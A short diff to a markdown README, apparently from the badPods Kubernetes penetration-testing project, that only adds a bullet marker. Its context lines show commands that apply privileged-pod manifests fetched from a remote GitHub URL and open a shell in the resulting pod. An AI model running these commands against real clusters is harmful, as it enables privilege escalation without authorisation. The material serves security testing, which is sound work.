@@ -42,7 +42,7 @@ kubectl exec -it priv-exec-pod -- bash
 ```
 **Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/[RESOURCE_TYPE]/priv-exec-[RESOURCE_TYPE].yaml 
